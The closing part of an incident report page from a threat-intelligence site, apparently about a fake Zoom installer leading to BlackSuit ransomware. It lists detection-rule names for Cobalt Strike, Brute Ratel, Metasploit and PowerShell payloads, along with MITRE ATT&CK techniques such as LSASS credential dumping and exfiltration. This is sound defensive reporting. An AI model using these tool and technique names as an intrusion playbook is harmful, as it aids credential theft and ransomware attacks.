+SECUINFRA_SUSP_Powershell_Base64_Decode
+SIGNATURE_BASE_Cobaltstrike_Sleep_Decoder_Indicator
+SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_4_2_Decrypt
+SIGNATURE_BASE_HKTL_Cobaltstrike_Sleepmask_Jul22
+SIGNATURE_BASE_Msfpayloads_Msf_Ref
+SIGNATURE_BASE_SUSP_Fake_AMSI_DLL_Jun23_1
+SIGNATURE_BASE_SUSP_PS1_Frombase64String_Content_Indicator
+SIGNATURE_BASE_SUSP_PS1_JAB_Pattern_Jun22_1
+SIGNATURE_BASE_SUSP_Scheduled_Task_Bigsize
+SIGNATURE_BASE_Wiltedtulip_Windowstask
+SUSP_PS1_FromBase64String_Content_Indicator
+SUSP_PS1_JAB_Pattern_Jun22_1
+SUSP_XORed_URL_In_EXE
+WiltedTulip_WindowsTask
+Windows_Trojan_BruteRatel_5b12cbab
+</pre>
+
+
+
+<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42889" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_060.png" alt="" width="1728" height="3334" /></a></p>
+
+
+
+
+
+<pre class="wp-block-preformatted">Access Token Manipulation - T1134                                                                                                                                                                           
+Archive via Utility - T1560.001                                                                                                                                                                             
+Data Encrypted for Impact - T1486                                                                                                                                                                           
+Dead Drop Resolver - T1102.001                                                                                                                                                                              
+Domain Groups - T1069.002                                                                                                                                                                                   
+Domain Trust Discovery - T1482                                                                                                                                                                              
+Drive-by Compromise - T1189                                                                                                                                                                                 
+Exfiltration to Cloud Storage - T1567.002                                                                                                                                                                   
+Hidden Files and Directories - T1564.001                                                                                                                                                                    
+Ingress Tool Transfer - T1105                                                                                                                                                                               
+Inhibit System Recovery - T1490                                                                                                                                                                             
+Lateral Tool Transfer - T1570                                                                                                                                                                               
+Local Account - T1087.001                                                                                                                                                                                   
+Local Groups - T1069.001                                                                                                                                                                                    
+LSASS Memory - T1003.001                                                                                                                                                                                    
+Malicious File - T1204.002                                                                                                                                                                                  
+MSBuild - T1127.001                                                                                                                                                                                         
+Network Share Discovery - T1135                                                                                                                                                                             
+PowerShell - T1059.001                                                                                                                                                                                      
+Protocol Tunneling - T1572
+Registry Run Keys / Startup Folder - T1547.001
+Regsvr32 - T1218.010
+Remote Desktop Protocol - T1021.001
+Remote System Discovery - T1018
+SectopRAT
+Security Software Discovery - T1518.001
+Service Execution - T1569.002
+SMB/Windows Admin Shares - T1021.002
+System Information Discovery - T1082
+System Owner/User Discovery - T1033
+Web Protocols - T1071.001
+Windows Command Shell - T1059.003
+Windows Management Instrumentation - T1047
+</pre>
+
+
+
+<p class="wp-block-paragraph">Internal case #TB29354 #PR35002</p>
+						
+						<div class="av-share-box"><h5 class='av-share-link-description av-no-toc '>Share this entry</h5><ul class="av-share-box-list noLightbox"><li class='av-share-link av-social-link-facebook' ><a target="_blank" aria-label="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/&amp;t=Fake%20Zoom%20Ends%20in%20BlackSuit%20Ransomware" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on Facebook" rel="noopener"><span class='avia_hidden_link_text'>Share on Facebook</span></a></li><li class='av-share-link av-social-link-x' ><a target="_blank" aria-label="Share on X" href="https://x.com/share?text=Fake%20Zoom%20Ends%20in%20BlackSuit%20Ransomware&amp;url=https://thedfirreport.com/?p=42828" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on X" rel="noopener"><span class='avia_hidden_link_text'>Share on X</span></a></li><li class='av-share-link av-social-link-whatsapp' ><a target="_blank" aria-label="Share on WhatsApp" href="https://api.whatsapp.com/send?text=https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello" title="" data-avia-related-tooltip="Share on WhatsApp" rel="noopener"><span class='avia_hidden_link_text'>Share on WhatsApp</span></a></li><li class='av-share-link av-social-link-linkedin' ><a target="_blank" aria-label="Share on Linkedin" href="https://linkedin.com/shareArticle?mini=true&amp;title=Fake%20Zoom%20Ends%20in%20BlackSuit%20Ransomware&amp;url=https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="" data-avia-related-tooltip="Share on Linkedin" rel="noopener"><span class='avia_hidden_link_text'>Share on Linkedin</span></a></li><li class='av-share-link av-social-link-reddit' ><a target="_blank" aria-label="Share on Reddit" href="https://reddit.com/submit?url=https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/&amp;title=Fake%20Zoom%20Ends%20in%20BlackSuit%20Ransomware" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello" title="" data-avia-related-tooltip="Share on Reddit" rel="noopener"><span class='avia_hidden_link_text'>Share on Reddit</span></a></li><li class='av-share-link av-social-link-mail' ><a aria-label="Share by Mail" href="/cdn-cgi/l/email-protection#f7c88482959d929483cab1969c92d2c5c7ad98989ad2c5c7b2999384d2c5c79e99d2c5c7b59b96949ca4829e83d2c5c7a5969984989a80968592d1d4c7c4cfcc9598938eca9f83838784cdd8d8839f9293919e85859287988583d994989ad8c5c7c5c2d8c7c4d8c4c6d891969c92da8d98989ada92999384da9e99da959b96949c84829e83da85969984989a80968592d8" aria-hidden='false' data-av_icon='' data-av_iconfont='fa-fontello' title='' data-avia-related-tooltip='Share by Mail'><span class='avia_hidden_link_text'>Share by Mail</span></a></li></ul></div>					</div>
+
+				</div><!-- .glossary-columns -->
+
+			</div><!-- .entry-content-wrapper -->
+		</div><!-- .content -->
+	</div><!-- .container -->
+</div><!-- .single-content-section -->
+
+	<div class="main_color related-posts-section section-before-footer">
+		<div class="container">
+			<div class="content">
+				<div class="ep-columns related-posts-header">
+					<div class="ep-columns-inner">
+						<div class="ep-column">
+							<div class="h3">
+								<div class="av-special-heading-tag">Related Reports</div>
+							</div>
+						</div>
+						<div class="ep-column">
+							<a href="https://thedfirreport.com/reports/" class="avia-button avia-icon_select-no avia-style-default avia-color-link avia-size-large avia-position-left">
+								<span class="avia_iconbox_title">View all</span>
+							</a>
+
+						</div>
+					</div>
+				</div>
+			<div  class='ep-posts-grid-container ep-grid-wrapper ep-space-small  '  ><div class='ep-posts-grid ep-grid  facetwp-template ep-grid-columns  is-variable  '><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50310 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-akira' href='https://thedfirreport.com/category/ransomware/akira/' >akira</a> <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/' >                        <img width="1271" height="508" src="https://thedfirreport.com/wp-content/uploads/pr_36726_001.png" class="avia-img-lazy-loading-50388 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-akira' href='https://thedfirreport.com/category/ransomware/akira/' >akira</a>, <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/' >                                From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				June 29, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+<div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50191 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-thegentlemen' href='https://thedfirreport.com/category/ransomware/thegentlemen/' >thegentlemen</a> <a class='ep-item-term ep-item-term-flash-alert' href='https://thedfirreport.com/category/flash-alert/' >Flash Alert</a> <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/' >                        <img width="1702" height="971" src="https://thedfirreport.com/wp-content/uploads/fa-40048-001-1.png" class="avia-img-lazy-loading-50205 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-thegentlemen' href='https://thedfirreport.com/category/ransomware/thegentlemen/' >thegentlemen</a>, <a class='ep-item-term ep-item-term-flash-alert' href='https://thedfirreport.com/category/flash-alert/' >Flash Alert</a>, <a class='ep-item-term ep-item-term-ransomware' href='https://thedfirreport.com/category/ransomware/' >ransomware</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/' >                                Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				May 11, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+<div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-half-tablet one-third  entry entry-50133 entry-post   ep-item-has-button " >
+    <div class="ep-item-inner   ">
+        
+            <div class="header-post-wrapper"> 
+                                <div class="post-tags">
+                    <div class='ep-post-tags'><a class='ep-item-term ep-item-term-opendir' href='https://thedfirreport.com/category/opendir/' >opendir</a></div>
+                </div>
+                               
+            </div>
+      
+                        <div class="ep-item-media">
+                <div class="ep-item-image">
+                    <a class='noHover' href='https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/' >                        <img width="1309" height="873" src="https://thedfirreport.com/wp-content/uploads/40002-006_1.png" class="avia-img-lazy-loading-50153 attachment-post-thumbnail size-post-thumbnail" alt="" loading="lazy" decoding="async" />                    </a>                </div>
+            </div>
+            
+            <div class="ep-item-contents">
+            
+                                <div class="ep-post-terms">
+                    <a class='ep-item-term ep-item-term-opendir' href='https://thedfirreport.com/category/opendir/' >opendir</a>                </div>
+                             
+            
+                                    <div class="ep-item-title-wrapper ">        
+                        <h6 class="ep-item-title av-special-heading-tag" >
+                            <a class='noHover' href='https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/' >                                Bissa Scanner Exposed: AI-Assisted Mass Exploitation and Credential Harvesting                            </a>                        </h6>        
+                    </div>
+                         
+
+                          
+            
+            </div>  
+            
+            <div class="footer-post-wrapper">  
+                                    <div class="ep-item-button-wrapper">                    
+                        <a href="https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/"  class="avia-button avia-style-go avia-color-theme-color avia-size-large">
+                            <span class="avia_iconbox_title">Read more</span>
+                        </a>                    
+                    </div>
+                
+                                <div class="ep-post-date">
+                    	<div class="ep-post-meta">
+				April 22, 2026			</div>
+	                </div>
+                            </div>
+
+            </div>
+</div>
+
+</div></div>			</div>
+		</div>
+	</div>
+
+<div class="footer-page-content footer_color" id="footer-page"><div id='av_section_1'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-0  avia-builder-el-first  footer-section footer-section   container_wrap fullsize' style='  '   data-lazy-css='https://thedfirreport.com/wp-content/themes/dfir/assets/css/footer.css?1.1.81'><div class='container' ><main  class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-42828'><div class='entry-content-wrapper clearfix'>
+<div   class='ep-columns ep-space-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-1 '   ><div class='ep-columns-inner'><div  class="ep-column one-half   first  avia-builder-el-1  avia-builder-el-first   " ><div class="ep-column-inner" ><div><div  class='avia-image-container ep-flex  ep-space-small     avia-builder-el-2  avia-builder-el-no-sibling   ep-align-'  ><div class='avia-image-container-inner' ><div class='avia-image-overlay-wrap'><img decoding="async" loading='lazy' class='wp-image-865 avia-img-lazy-loading-865 avia_image' src="https://thedfirreport.com/wp-content/uploads/DFIR-Featured-Image@2x.png" alt='' title='DFIR-Featured-Image@2x' height="675" width="1200"  /></div></div></div></div></div></div><div  class="ep-column one-half     avia-builder-el-3   " ><div class="ep-column-inner" ><div><div  class='avia-buttonrow-wrap avia-buttonrow-right ep-space-small     avia-builder-el-4  avia-builder-el-no-sibling  ' >
+<a href='https://dfirlabs.thedfirreport.com/auth/login'  class='avia-button  avia-icon_select-no avia-style-main avia-color-red avia-size-medium'  target="_blank"  style='margin-bottom:5px; margin-left:5px; ' ><span class='avia_iconbox_title' >Access DFIR Labs</span></a>
+<a href='https://thedfirreport.com/company/contact-us/'  class='avia-button  avia-icon_select-no avia-style-main avia-color-gray avia-size-medium'  style='margin-bottom:5px; margin-left:5px; ' ><span class='avia_iconbox_title' >Book a Demo</span></a>
+</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-2 '   ><div class='ep-columns-inner'><div  class="ep-column two-fifths   first  avia-builder-el-5   column-top-margin" ><div class="ep-column-inner" ><div><div class="avia_textblock ep-text   avia-builder-el-6  avia-builder-el-first   ep-space-small     "   style='--epMaxWidthDesktop:348px; --epMaxWidthMobile:100%; '><p>The DFIR Report provides in-depth, real-world intelligence based on observed intrusions, enabling security analysts and teams  to strengthen defenses, enhance detection,  and accelerate response.</p>
+</div>
+			<div  class='ep-social-bookmarks-wrapper   avia-builder-el-7  avia-builder-el-last  '>
+				<ul class='noLightbox ep-social-bookmarks ep-align-left icon_count_2'><li class='ep-social-bookmarks ep-align-left_linkedin av-social-link-linkedin social_icon_1'><a target="_blank" aria-label="Link to Linkedin" href="https://www.linkedin.com/company/the-dfir-report" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="Linkedin" rel="noopener"><span class='avia_hidden_link_text'>Linkedin</span></a></li><li class='ep-social-bookmarks ep-align-left_x av-social-link-x social_icon_2'><a target="_blank" aria-label="Link to X" href="https://x.com/TheDFIRReport" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="X" rel="noopener"><span class='avia_hidden_link_text'>X</span></a></li></ul>			</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-8   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-9  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-1" class="menu" role="menu"><li role="menuitem" id="menu-item-964" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-970" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat Intel</span></a></li>
+	<li role="menuitem" id="menu-item-968" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+	<li role="menuitem" id="menu-item-966" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	<li role="menuitem" id="menu-item-49372" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+	<li role="menuitem" id="menu-item-967" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+	<li role="menuitem" id="menu-item-965" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-10   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-11  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-2" class="menu" role="menu"><li role="menuitem" id="menu-item-974" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Services</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-976" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a></li>
+	<li role="menuitem" id="menu-item-975" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-973" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-12  avia-builder-el-last   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-horizontal   avia-builder-el-13  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-menu-3" class="menu" role="menu"><li role="menuitem" id="menu-item-977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/company/" tabindex="0"><span class="avia-menu-text">Company</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-978" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+	<li role="menuitem" id="menu-item-979" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/analysts/" tabindex="0"><span class="avia-menu-text">Analysts</span></a></li>
+	<li role="menuitem" id="menu-item-980" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+	<li role="menuitem" id="menu-item-981" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 -->
+</p>
+<p></div></div></main><!-- close content main element --></div></div><div id='av_section_2'  class='avia-section main_color avia-section-default avia-no-border-styling  avia-bg-style-scroll  avia-builder-el-14  avia-builder-el-last  footer-socket-section   container_wrap fullsize' style='  '   data-lazy-css='https://thedfirreport.com/wp-content/themes/dfir/assets/css/footer.css?1.1.81'><div class='container' ><div class='template-page content  av-content-full alpha units' ><div class='post-entry post-entry-type-page post-entry-42828'><div class='entry-content-wrapper clearfix'>
+<div class="avia_textblock ep-text   avia-builder-el-15  avia-builder-el-no-sibling   ep-space-small     "  ><p style="text-align: center;">© 2025 The DFIR Report. All Rights Reserved. | <a href="https://thedfirreport.com/privacy-policy/">Privacy Policy</a></p>
+</div>
+</p>
+</div></div></div><!-- close content main div --> <!-- section close by builder template -->		</div><!--end builder template--></div><!-- close default .container_wrap element --></div>
+
+			<!-- end main -->
+		</div>
+
+		<!-- end wrap_all --></div>
+<div id="fb-root"></div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/dfir/*","/wp-content/themes/punch/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+ <script type='text/javascript'>
+ /* <![CDATA[ */  
+var punch_globals = punch_globals || {};
+    punch_globals.siteUrl = 'https' + '://' + 'thedfirreport.com/';
+    punch_globals.frameworkUrl = 'https' + '://' + 'thedfirreport.com/wp-content/themes/punch/framework/';
+    punch_globals.installedAt = 'https' + '://' + 'thedfirreport.com/wp-content/themes/punch/';
+    punch_globals.ajaxurl = 'https' + '://' + 'thedfirreport.com/wp-admin/admin-ajax.php';
+/* ]]> */ 
+</script>
+ 
+ <script id="avia-module-enfold-fast-lazy-enabler-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/dist/lazy-enabler.js?ver=1.0.94"></script>
+<script id="avia-module-enfold-fast-lazy-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/enfold-fast-lazy.js?ver=1.0.94"></script>
+<script id="avia-module-enfold-fast-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/enfold-fast.js?ver=1.0.94"></script>
+<script id="avia-module-main-js" src="https://thedfirreport.com/wp-content/themes/dfir/assets/js/main.js?ver=1.1.81"></script>
+<script id="jetpack-stats-js-before">
+_stq = window._stq || [];
+_stq.push([ "view", {"v":"ext","blog":"175340963","post":"42828","tz":"0","srv":"thedfirreport.com","j":"1:16.0.1"} ]);
+_stq.push([ "clickTrackerInit", "175340963", "42828" ]);
+//# sourceURL=jetpack-stats-js-before
+</script>
+<script data-wp-strategy="defer" defer fetchpriority="low" id="jetpack-stats-js" src="https://stats.wp.com/e-202631.js"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://thedfirreport.com/wp-includes/js/wp-emoji-release.min.js?ver=7.0.2"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://thedfirreport.com/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	<script>document.write('<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/punch/assets/css/body.css?v=1.0.94">');</script>
+    	<script>document.write('<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/dfir/assets/css/body.css?v=1.1.81">');</script>
+    </body>
+</html>
